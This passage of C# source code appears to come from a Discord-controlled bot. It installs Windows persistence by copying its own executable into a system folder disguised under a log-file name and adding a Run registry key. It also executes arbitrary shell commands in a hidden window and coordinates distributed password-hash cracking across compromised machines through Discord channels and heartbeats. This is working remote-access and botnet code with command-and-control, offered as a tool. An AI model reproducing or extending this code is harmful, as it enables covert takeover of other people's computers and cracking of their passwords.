                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Uninstalling persistence..."));

                    // Delete registry key
                    try
                    {
                        RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        key.DeleteValue(registryName);
                        // Send discord message
                        await channel.SendMessageAsync($"Removed registry key!");
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Removed registry key!"));
                        regeditPersistenceInstalled = false;
                    }
                    catch (Exception ex)
                    {
                        // Send discord message
                        await channel.SendMessageAsync($"Error removing registry key: {ex.Message}");
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error removing registry key: {ex.Message}"));
                    }

                    // Delete files in drop point
                    try
                    {
                        string[] files = Directory.GetFiles(dropPath);
                        foreach (string file in files)
                        {
                            string fileName = Path.GetFileName(file);
                            string fullFilePath = Path.Combine(dropPath, fileName);
                            File.Delete(fullFilePath);
                            // Log
                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted {fileName} from {dropPath}"));
                        }
                        exePersistenceInstalled = false;
                    }
                    catch (Exception ex)
                    {
                        // Send discord message
                        await channel.SendMessageAsync($"Error deleting files from drop point: {ex.Message}");
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error deleting files from drop point: {ex.Message}"));
                    }

                    // Delete drop point
                    try
                    {
                        Directory.Delete(dropPath);
                        // Send discord message
                        await channel.SendMessageAsync($"Deleted drop point!");
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted drop point!"));
                    }
                    catch (Exception ex)
                    {
                        // Send discord message
                        await channel.SendMessageAsync($"Error deleting drop point: {ex.Message}");
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error deleting drop point: {ex.Message}"));
                    }

                    // Check if both are installed
                    if (regeditPersistenceInstalled || exePersistenceInstalled)
                    {
                        anyPersistenceInstalled = true;
                    }

                    if (!anyPersistenceInstalled)
                    {
                        // Send discord message
                        await channel.SendMessageAsync($"Persistence uninstalled!");
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence uninstalled!"));
                    }
                    else
                    {
                        // Send discord message
                        await channel.SendMessageAsync($"Error uninstalling persistence. Please try again.");
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Please try again."));

                        // Send discord message and log what is still installed
                        if (regeditPersistenceInstalled)
                        {
                            await channel.SendMessageAsync($"Regedit persistence is still installed.");
                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is still installed."));
                        }
                        if (exePersistenceInstalled)
                        {
                            await channel.SendMessageAsync($"Exe persistence is still installed.");
                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is still installed."));
                        }
                    }
                }
            }
            else
            {
                // Send discord message
                await channel.SendMessageAsync($"Persistence is not installed.");
                // Log
                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is not installed."));
            }
        }

        async void InstallSpecialPersistence()
        {
            // Make a copy of current executable and put it in "C:\windows\security\database" folder as "WindowsSecurity.log"
            // Find the name of computer
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();
           
            // Find the channel
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");

            if (channel == null)
            {
                // Log
                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Channel not found."));
                return;
            }

            // Check if admin
            bool isAdmin = IsAdministrator();

            // if not admin
            if (!isAdmin)
            {
                // Log
                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Not admin..."));
                channel.SendMessageAsync("Error: Not admin... (Tip use **!elevate** to ask for elevation.)");
            }
            else
            {
                // Log
                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installing special persistence..."));

                // Set important variables
                string exePath = Application.ExecutablePath;
                string exeName = Path.GetFileName(exePath);
                string newExePath = Path.Combine(@"C:\windows\security\database", $"{fileNameSpecial}");
                string targetDirectory = @"C:\windows\security\database";

                if (!Directory.Exists(targetDirectory))
                {
                    Directory.CreateDirectory(targetDirectory);
                }

                // Check if the executable is in droppoint
                if (File.Exists(newExePath))
                {
                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is already installed."));
                    channel.SendMessageAsync($"Exe persistence is already installed. (Path to EXE: {newExePath})");
                }
                else
                {
                    // Copy the executable to drop point
                    try
                    {
                        File.Copy(exePath, newExePath);
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Copied {exePath} to {newExePath}"));
                    }
                    catch (Exception ex)
                    {
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error copying {exePath} to {newExePath}: {ex.Message}"));
                        channel.SendMessageAsync($"Error copying {exePath} to {newExePath}: {ex.Message}");
                    }
                }

                // Check for registry key
                RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                string[] subKeys = keyCheck.GetValueNames();
                bool regeditPersistenceInstalled = false;
                foreach (string subKey in subKeys)
                {
                    if (subKey == registryName)
                    {
                        regeditPersistenceInstalled = true;
                    }
                }
                if (regeditPersistenceInstalled)
                {
                       // Log
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is already installed."));
                    channel.SendMessageAsync($"Regedit persistence is already installed. (Keyname: {registryName})");
                }
                else
                {
                    // Create registry key
                    try
                    {
                        RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        key.SetValue(registryName, newExePath);
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Installed persistence."));
                        channel.SendMessageAsync("Installed persistence.");
                    }
                    catch (Exception ex)
                    {
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error adding registry key: {ex.Message}"));
                        channel.SendMessageAsync($"Error adding registry key: {ex.Message}");
                    }
                }

                // Check if both are installed
                if (regeditPersistenceInstalled && File.Exists(newExePath))
                {
                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is installed."));
                    channel.SendMessageAsync("Persistence is installed.");
                }
                else
                {
                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is not installed."));
                    channel.SendMessageAsync("Persistence is not installed.");
                }
                
            }
        }
        async void UninstallSpecialPersistence()
        {
            // Remove the registry key and also delete the executable in "C:\windows\security\database" folder
            // Find the name of computer
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();

            // Find the channel
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
   
            if (channel == null)
            {
                // Log
                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error installing persistence. Channel not found."));
                return;
            }

            // Check if admin
            bool isAdmin = IsAdministrator();
            if (!isAdmin)
            {
                // Log
                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Not admin..."));
                channel.SendMessageAsync("Error: Not admin... (Tip use **!elevate** to ask for elevation.)");
                return;
            }
            else
            {
                // Log
                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Uninstalling special persistence..."));

                // Set important variables
                string exePath = Application.ExecutablePath;
                string exeName = Path.GetFileName(exePath);
                string newExePath = Path.Combine(@"C:\windows\security\database", $"{fileNameSpecial}");
                string targetDirectory = @"C:\windows\security\database";

                // Check if the executable is in droppoint
                if (File.Exists(newExePath))
                {
                    // Delete the executable
                    try
                    {
                        File.Delete(newExePath);
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted {newExePath}"));
                    }
                    catch (Exception ex)
                    {
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error deleting {newExePath}: {ex.Message}"));
                        channel.SendMessageAsync($"Error deleting {newExePath}: {ex.Message}");
                    }
                }
                else
                {
                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is not installed."));
                    channel.SendMessageAsync($"Exe persistence is not installed. (Path to EXE: {newExePath})");
                }

                // Check for registry key
                RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                string[] subKeys = keyCheck.GetValueNames();
                bool regeditPersistenceInstalled = false;

                foreach (string subKey in subKeys)
                {
                    if (subKey == registryName)
                    {
                        regeditPersistenceInstalled = true;
                    }
                }

                if (regeditPersistenceInstalled)
                {
                    // Delete registry key
                    try
                    {
                        RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        key.DeleteValue(registryName);
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Removed registry key!"));
                        channel.SendMessageAsync("Removed registry key!");
                    }
                    catch (Exception ex)
                    {
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error removing registry key: {ex.Message}"));
                        channel.SendMessageAsync($"Error removing registry key: {ex.Message}");
                    }
                }
                else
                {
                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is not installed."));
                    channel.SendMessageAsync($"Regedit persistence is not installed. (Keyname: {registryName})");
                }

                // Check if both are installed
                if (regeditPersistenceInstalled || File.Exists(newExePath))
                {
                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is installed."));
                    channel.SendMessageAsync("Persistence is installed.");
                }
                else
                {
                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is not installed."));
                    channel.SendMessageAsync("Persistence is not installed.");
                }
            }
        }


        // CMD Execution
        public string ExecuteCommand(string command)
        {
            // Execute command with cmd and return the output
            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", $"/c {command}")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true, // Redirect output
                RedirectStandardError = true,  // Redirect error (optional)
                WindowStyle = ProcessWindowStyle.Hidden
            };

            using (Process process = new Process())
            {
                process.StartInfo = processInfo;
                process.Start();

                // Read the output and error asynchronously to prevent deadlocks
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                process.WaitForExit();

                // Check for errors
                if (!string.IsNullOrEmpty(error))
                {
                    return $"Error: {error}";
                }

                return output;
            }
        }



        // Forces argument
        public string SearchForArguments(string targetHash)
        {
            // Find Channel "hash" in the same guild and look through all messages
            var guildHash = _client.Guilds.FirstOrDefault(); // Get the first available guild
            var channelHash = guildHash.TextChannels.FirstOrDefault(ch => ch.Name == $"hash");
            
            // Get the last 100 messages
            var messagesHash = channelHash.GetMessagesAsync(100).FlattenAsync().Result;
            List<IMessage> messageListHash = messagesHash.ToList();

            // Loop through all messages
            foreach (var messageHash in messageListHash)
            {
                // Check if the message starts with the target hash
                if (messageHash.Content.StartsWith(targetHash))
                {
                    Log(new LogMessage(LogSeverity.Info, "Forces", $"Found hash in \"hash\" channel: {targetHash}"));

                    // Get each part of the message
                    string[] parts = messageHash.Content.Split(":");
                    string hash = parts[0];
                    string password = parts[1];

                    Log(new LogMessage(LogSeverity.Info, "Forces", $"Password found in storage!: {hash}:{password}"));
                    // Find channel bot in the same guild (bot-{computername-lowercase})
                    var guildBot = _client.Guilds.FirstOrDefault(); // Get the first available guild
                    string computerNameRaw = Environment.MachineName;
                    string computerName = computerNameRaw.ToLower();
                    var channelBot = guildBot.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");

                    // Send message
                    channelBot.SendMessageAsync($"**Password found in storage! {hash}:{password}**");
                    return "found";
                }
            }


            // Find channel "forces" in the same guild and look through all messages
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"forces");

            // Get the last 100 messages
            var messages = channel.GetMessagesAsync(100).FlattenAsync().Result;
            List<IMessage> messageList = messages.ToList();

            BigInteger totalCombinations = 0; // Total combinations
            BigInteger totalCheckedCombinations = 0; // Total checked combinations
            List<(int, int)> forceRanges = new List<(int, int)>(); // List to store force ranges
            bool passwordsLeft = true; // If there are passwords left to check
            int counter2 = 0;
            int foundHashes = 0;

            // Loop through all messages
            foreach (var message in messageList)
            {
                // Check if the message starts with the target hash
                if (message.Content.StartsWith(targetHash))
                {
                    Log(new LogMessage(LogSeverity.Info, "Forces", $"Found hash in \"forces\" channel: {targetHash}"));
                    foundHashes++;

                    // Get each part of the message
                    string[] parts = message.Content.Split(":");
                    string hash = parts[0];
                    string algorithm = parts[1];
                    bool useNumbers = Convert.ToBoolean(parts[2]);
                    bool useLetters = Convert.ToBoolean(parts[3]);
                    bool useSymbols = Convert.ToBoolean(parts[4]);
                    bool useCapitals = Convert.ToBoolean(parts[5]);
                    int max = Convert.ToInt32(parts[6]);
                    int min = Convert.ToInt32(parts[7]);
                    BigInteger combinations = Convert.ToInt32(parts[8]);
                    string forceSS = parts[9];

                    // Figure out how many points there are
                    string[] points = forceSS.Split(";");
                    int numberOfPoints = points.Length;

                    // Find the start and end of each point
                    int[] pointStarts = new int[numberOfPoints];
                    int[] pointEnds = new int[numberOfPoints];
                    int index = 0;

                    foreach (var point in points)
                    {
                        // Split the point by "," to find the start and end
                        string[] argumentsPoint = point.Split(",");

                        // Check if argumentsPoint has at least 2 elements
                        if (argumentsPoint.Length >= 2)
                        {
                            // Get the start and end
                            int start = Convert.ToInt32(argumentsPoint[0]);
                            int end = Convert.ToInt32(argumentsPoint[1]);

                            // Add it to the arrays
                            pointStarts[index] = start;
                            pointEnds[index] = end;
                        }
                        else
                        {
                            // Log an error or handle the situation where the format is incorrect
                            Log(new LogMessage(LogSeverity.Error, "Forces", $"Invalid format in point: {point}"));
                        }

                        // Increment the index
                        index++;
                    }

                    // Set Combinations to the total combinations
                    totalCombinations = combinations;

                    // Add to totalCheckedCombinations (Each pointEnd - pointStart + 1)
                    foreach (var pointEnd in pointEnds)
                    {
                        totalCheckedCombinations += pointEnd - pointStarts[0] + 1;
                    }
                    Log(new LogMessage(LogSeverity.Info, "Forces", $"Total combinations: {totalCombinations}"));
                    Log(new LogMessage(LogSeverity.Info, "Forces", $"Total checked combinations: {totalCheckedCombinations}"));


                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Forces", $"ForcesSS: {forceSS}"));
                    // Log each point
                    try
                    {
                        for (int i = 0; i < numberOfPoints; i++)
                        {
                            try
                            {
                                Log(new LogMessage(LogSeverity.Info, "Forces", $"Point {i}: {pointStarts[i]} - {pointEnds[i]}"));

                                // Add it to the list of force ranges
                                if (pointStarts[i] - 1 > 0)
                                {
                                    forceRanges.Add((pointStarts[i], pointEnds[i]));
                                }
                                else
                                {
                                    forceRanges.Add((pointStarts[i], pointEnds[i]));
                                }
                            }
                            catch (Exception ex)
                            {
                                // Log
                                Log(new LogMessage(LogSeverity.Error, "Forces", $"Error sending points: {ex.Message}"));
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Forces", $"Error sending points: {ex.Message}"));
                    }

                    
                }

            }

            if (foundHashes == 0)
            {
                // Return "not found" that means no hash was found
                return "not found";
            }

            // Print all force ranges
            Log(new LogMessage(LogSeverity.Info, "Forces", $"Total force ranges: {forceRanges.Count}"));

            // Check all points/ranges
            foreach (var forceRange in forceRanges)
            {
                counter2++;
                Log(new LogMessage(LogSeverity.Info, "Forces", $"Checking range: {forceRange.Item1} - {forceRange.Item2} ({counter2})"));
            }

            // Check if there are passwords left to check
            if (totalCheckedCombinations >= totalCombinations)
            {
                passwordsLeft = false;
            }

            // Find inverse of forceRanges (from 0 to totalCombonations)
            // Array of inverse points
            List<BigInteger> InversePoints = new List<BigInteger>();
            List<(BigInteger, BigInteger)> inverseForceRanges = new List<(BigInteger, BigInteger)>();
            List<(BigInteger, BigInteger)> NewPoints = new List<(BigInteger, BigInteger)>();
            foreach (var forceRange in forceRanges)
            {
                // We have the total combinations and all ranges that are already checked and need to create new ranges that are not checked

                // Take all points start - 1 (execpt if original is 0) and all points end + 1
                // Example: 0-100, 200-300, 400-500
                // New points: 99-101, 199-301, 399-501

                foreach (var forceRange2 in forceRanges)
                {
                    if (forceRange2.Item1 - 1 > 0)
                    {
                        NewPoints.Add((forceRange2.Item1 - 1, forceRange2.Item2 + 1));
                    }
                    else
                    {
                        NewPoints.Add((forceRange2.Item1, forceRange2.Item2 + 1));
                    }
                }

                // Sort the new points
                NewPoints.Sort((x, y) => x.Item1.CompareTo(y.Item1));

                // Log
                foreach (var forceRange2 in NewPoints)
                {
                    Log(new LogMessage(LogSeverity.Info, "Forces", $"Point checked margin: {forceRange2.Item1} - {forceRange2.Item2}"));
                }
            }

            // Now find the inverse of the new points
            // Example: 0-100, 200-300, 400-500
            // New points: 0, 101-199, 301-399, 501-1001

            // For each combination try a number between 0 and totalCombinations and check if it is in any of the ranges
            for (BigInteger i = 0; i < totalCombinations; i++)
            {
                bool found = false;
                foreach (var forceRange2 in NewPoints)
                {
                    if (i >= forceRange2.Item1 && i <= forceRange2.Item2)
                    {
                        found = true;
                    }
                }
                if (!found)
                {
                    // Add it to the list of inverse points
                    InversePoints.Add((i));
                }
            }

            // Log
            Log(new LogMessage(LogSeverity.Info, "Forces", $"INVERSE: Number of points not checked: {InversePoints.Count}"));



            // Calculate the inverse ranges
            // 0 - [1].item1
            // [1].item2 - [2].item1
            // [2].item2 - [3].item1
            // [3].item2 - [4].item1

            if (NewPoints[0].Item1 != 0)
            {
                // Add the range to the list of inverse ranges
                inverseForceRanges.Add((0, NewPoints[0].Item1));
                // Log
                Log(new LogMessage(LogSeverity.Info, "Forces", $"INVERSE: Range added to inverse: {NewPoints[0].Item1}"));
            }
            for (int i = 0; i < NewPoints.Count - 1; i++)
            {
                // Add the range to the list of inverse ranges
                inverseForceRanges.Add((NewPoints[i].Item2, NewPoints[i + 1].Item1));
                // Log
                Log(new LogMessage(LogSeverity.Info, "Forces", $"INVERSE: Range added to inverse: {NewPoints[i].Item2} - {NewPoints[i + 1].Item1}"));
            }
            if (NewPoints[NewPoints.Count - 1].Item2 != totalCombinations)
            {
                // Add the range to the list of inverse ranges
                inverseForceRanges.Add((NewPoints[NewPoints.Count - 1].Item2, totalCombinations));
                // Log
                Log(new LogMessage(LogSeverity.Info, "Forces", $"INVERSE: Range added to inverse: {NewPoints[NewPoints.Count - 1].Item2} - {totalCombinations}"));
            }

            // Logging
            foreach (var forceRange in inverseForceRanges)
            {
                Log(new LogMessage(LogSeverity.Info, "Forces", $"Inverse range: {forceRange.Item1} - {forceRange.Item2}"));
            }


            // Calculate !startCommand (!start 100,200;500,600)
            string startCommand = "!start ";
            foreach (var forceRange in inverseForceRanges)
            {
                startCommand += $"{forceRange.Item1},{forceRange.Item2};";
            }
            // Remove the last ";" from the !startCommand
            startCommand = startCommand.Remove(startCommand.Length - 1);

            // Log
            Log(new LogMessage(LogSeverity.Info, "Forces", $"BEFORE !startCommand: {startCommand}"));

            // Remove if there is any unexecutable code
            startCommand = startCommand.Replace("0,-1;", "");

            // Log
            Log(new LogMessage(LogSeverity.Info, "Forces", $"AFTER !startCommand: {startCommand}"));

            // Return gathered information (True:<hash>:<startCommand>:<TotalCombinations>)
            return $"{passwordsLeft}:{targetHash}:{startCommand}:{totalCombinations}";
        }





        // Auto
        // Set auto settings
        public void updateAutoSettings()
        {
            // Find channel "settings" in the same guild and look through all messages
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"settings");
            if ( channel != null )
            {
                // Get the last message
                var messages = channel.GetMessagesAsync(1).FlattenAsync().Result;
                List<IMessage> messageList = messages.ToList();

                // Loop through all messages (One message selected so only one)
                foreach (var message in messageList)
                {
                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Auto", $"Auto settings found: {message}"));
                    // Get each part of the message
                    string[] parts = message.Content.Split(":");
                    AutoHash = parts[0];
                    AutoAlgorithm = parts[1];
                    AutoUseNumbers = Convert.ToBoolean(parts[2]);
                    AutoUseLetters = Convert.ToBoolean(parts[3]);
                    AutoUseSymbols = Convert.ToBoolean(parts[4]);
                    AutoUseCapitals = Convert.ToBoolean(parts[5]);
                    AutoMaxLength = Convert.ToInt32(parts[6]);
                    AutoMinLength = Convert.ToInt32(parts[7]);

                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Auto", $"Auto settings set."));

                    // For backup purposes send the settings to the bot channel
                    // Find channel bot in the same guild (bot-{computername-lowercase})
                    var guildBot = _client.Guilds.FirstOrDefault(); // Get the first available guild
                    string computerNameRaw = Environment.MachineName;
                    string computerName = computerNameRaw.ToLower();
                    var channelBot = guildBot.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");

                    // Send message
                    channelBot.SendMessageAsync($"!setHash {parts[0]}");
                    channelBot.SendMessageAsync($"!setAlgorithm {parts[1]}");

                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Auto", $"Auto settings sent to bot channel."));

                }

            }
        }
        
        // Find and select auto split
        public void findAndSelectAutoSplit()
        {
            // Variables
            List<(BigInteger, BigInteger)> fullPoints = new List<(BigInteger, BigInteger)>();

            // Find its own channel (bot-{computername-lowercase})
            var guildBot = _client.Guilds.FirstOrDefault(); // Get the first available guild
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();
            var channelBot = guildBot.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");

            // Find channel "splits" in the same guild and look through all messages
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"splits");
            if (channel != null)
            {
                // Get the last message
                var messages = channel.GetMessagesAsync(1).FlattenAsync().Result;
                List<IMessage> messageList = messages.ToList();

                // Loop through all messages (One message selected so only one)
                foreach (var message in messageList)
                {
                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Auto", $"Split settings found: {message}"));

                    // Get each part of the message
                    string[] clusters = message.Content.Split(";");

                    // Now look through all clusters and split by ","
                    foreach (var cluster in clusters)
                    {
                        // Split by ","
                        string[] pointsRaw = cluster.Split(",");

                        // Check if there are at least 2 points
                        if (pointsRaw.Length >= 2)
                        {
                            // Get the start and end
                            if (BigInteger.TryParse(pointsRaw[0], out BigInteger start) &&
                                BigInteger.TryParse(pointsRaw[1], out BigInteger end))
                            {
                                // Add it to the list of points
                                fullPoints.Add((start, end));

                                // Log
                                Log(new LogMessage(LogSeverity.Info, "Auto", $"Full point added: {start} - {end}"));
                            }
                            else
                            {
                                // Handle parsing errors, if needed
                                // Log
                                Log(new LogMessage(LogSeverity.Error, "Auto", $"Error parsing BigInteger: {cluster}"));
                            }

                        }
                        else
                        {
                            // Log an error or handle the situation where the format is incorrect
                            Log(new LogMessage(LogSeverity.Error, "Auto", $"Invalid format in cluster: {cluster}"));
                        }
                        
                    }

                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Auto", $"Auto split set."));
                }

                try
                {
                    // Now we have all the points in fullPoints (example: 0-100, 200-300, 400-500)
                    // Choose the first one as AutoForcesSS
                    AutoForcesSS = $"{fullPoints[0].Item1},{fullPoints[0].Item2}";

                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Auto", $"AutoForcesSS set: {AutoForcesSS}"));
                }
                catch (Exception ex)
                {
                    // Log
                    Log(new LogMessage(LogSeverity.Error, "Auto", $"Error setting AutoForcesSS: {ex.Message}"));
                }

                try
                {
                    // Now start cracking with auto-settings (change normal settings to auto-settings)
                    // Set settings
                    hash = AutoHash;
                    Algorithm = AutoAlgorithm;
                    UseNumbers = AutoUseNumbers;
                    UseLetters = AutoUseLetters;
                    UseSymbols = AutoUseSymbols;
                    UseCapitals = AutoUseCapitals;
                    MaxLength = AutoMaxLength;
                    MinLength = AutoMinLength;
                    forcesSS = AutoForcesSS;

                    // Log
                    Log(new LogMessage(LogSeverity.Info, "Auto", $"Normal settings set to auto settings. Ready to crack"));
                }
                catch (Exception ex)
                {
                    // Log
                    Log(new LogMessage(LogSeverity.Error, "Auto", $"Error setting settings: {ex.Message}"));
                }

                try
                {
                    // Start cracking...
                    counter = 0;
                    AccualCount = 0;
                    stopwatch.Reset();
                    // Simulate a button press of btnStartCracking
                    btnStartCracking_Click(null, null);
                    channelBot.SendMessageAsync("Cracking started... Use **!status** it see its progress!");
                }
                catch (Exception ex)
                {
                    // Log
                    Log(new LogMessage(LogSeverity.Error, "Auto", $"Error starting cracking: {ex.Message}"));
                }
            }
        }




        // Timer
        private async Task TimerThread()
        {
            Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Heartbeat started."));

            // First heartbeat
            SendHeartbeat(0);

            // Use System.Timers.Timer instead of System.Windows.Forms.Timer
            System.Timers.Timer heartbeatTimer = new System.Timers.Timer();
            heartbeatTimer.Interval = 30000; // Set the interval (e.g., 30 seconds)
            // Set the callback for the timer
            heartbeatTimer.Elapsed += (sender, e) =>
            {
                // Access 'this' in a way that doesn't impact your logic
                var unused = this.ToString();
                CheckOnOthers();
                SendHeartbeat(currentWarningLevel);
            };
            heartbeatTimer.Start();
        }
        async void SendHeartbeat(int level)
        {
            if (level == 1) {
                // Log (typically around 30 sec without answer)
                Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Warning 1"));
            }
            if (level == 2)
            {
                // Log (typically around 60 sec without answer)
                Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Warning 2"));
            }
            if (level == 3)
            {
                // Log (typically around 90 sec without answer)
                Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Warning 3"));
            }

            Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Sending heartbeat..."));
            try
            {
                // Send a heartbeat message to the discord created log-channel
                var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                string computerNameRaw = Environment.MachineName;
                string computerName = computerNameRaw.ToLower();
                var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");

                if (channel != null)
                {
                    // Send message
                    if (level == 0)
                    {
                        await channel.SendMessageAsync("Heartbeat");
                    }
                    else
                    {
                        await channel.SendMessageAsync("Heartbeat (Warning " + level + ")");
                    }
                    Log(new LogMessage(LogSeverity.Info, "Heartbeat", "Heartbeat sent."));
                }
                else
                {
                    Log(new LogMessage(LogSeverity.Error, "Heartbeat", $"Error sending heartbeat. Channel not found. ({computerName})"));
                }
            }
            catch (Exception ex)
            {
                // Handle exceptions (e.g., log or display an error message)
                Log(new LogMessage(LogSeverity.Error, "Heartbeat", $"Error sending heartbeat: {ex.Message}"));
            }
        }



        // Find other bots
        private List<string> FindOthers()
        {
            // New list of possible bots
            List<string> possibleBots = new List<string>();

            try
            {
                // Look for text channels in server that start with "bot-"
                var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                var channels = guild.TextChannels;

                foreach (var channel in channels)
                {
                    if (channel.Name.StartsWith("bot-"))
                    {
                        // Get the name of the computer
                        string computerNameRaw = channel.Name;
                        string computerName = computerNameRaw.Substring(4);

                        // Check if the computer name is the same as this computer
                        if (computerName != Environment.MachineName)
                        {
                            // Check if the channel has sent a heartbeat in the last 30 seconds
                            var lastMessage = channel.GetMessagesAsync(1).FlattenAsync().Result.FirstOrDefault();
                            if (lastMessage != null)
                            {
                                var timeDifference = DateTime.Now - lastMessage.Timestamp.DateTime;
                                if (timeDifference.TotalSeconds > 30)
                                {
                                    // The channel has sent a heartbeat in the last 30 seconds
                                    // Add it to the list of other bots (possibleBots)
                                    possibleBots.Add(computerName);
                                }
                                else
                                {
                                    // The channel has not sent a heartbeat in the last 30 seconds
                                    Log(new LogMessage(LogSeverity.Error, "Discord", $"No heartbeat found in {channel.Name}. Will now remove the channel and possible bot"));
                                    // Delete channel
                                    channel.DeleteAsync();
                                }
                            }
                            else
                            {
                                // No messages found in the channel
                                Log(new LogMessage(LogSeverity.Error, "Discord", $"No messages found in {channel.Name}. Will now remove the channel and possible bot"));
                                // Delete channel
                                channel.DeleteAsync();
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // Catch any error
                Log(new LogMessage(LogSeverity.Error, "Discord", $"Error finding other bots. {ex.Message}"));
            }

            // Return the list of active computers with a heartbeat
            return possibleBots;
        }
        private async void CheckOnOthers()
        {
            // Basicly just check if the other bots have found the password
            // If they have, then stop cracking
            // If they haven't, then continue cracking
            // If there are no other bots, then continue cracking
            // If there are other bots, but they haven't sent a heartbeat in the last 90 seconds, remove bot (its dead...)
            // Also give out warnings to bots.

            // Find other bots
            computers = FindOthers();
            // Log the active computers
            foreach (var computer in computers)
            {
                Log(new LogMessage(LogSeverity.Info, "Discord", $"Found active computer: {computer}"));
                // Access their own channel
                var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computer}");
                // Get the last message
                var lastMessage = (await channel.GetMessagesAsync(1).FlattenAsync()).FirstOrDefault();

                // Get the latest 3 messages
                var messages = await channel.GetMessagesAsync(3).FlattenAsync();

                // Check time difference between now and then
                var timeDifference = (DateTime.UtcNow - lastMessage.Timestamp.UtcDateTime).TotalSeconds;
                Log(new LogMessage(LogSeverity.Info, "Discord", $"Time difference: {timeDifference} seconds"));
                Log(new LogMessage(LogSeverity.Info, "Discord", $"Timestamp: {lastMessage.Timestamp}"));
                Log(new LogMessage(LogSeverity.Info, "Discord", $"UtcNow: {DateTime.UtcNow}"));

                // "password found! <hash>:<pass>"
                if (lastMessage.Content.StartsWith("Password found!"))
                {
                    // The other bot has found the password
                    // Stop cracking
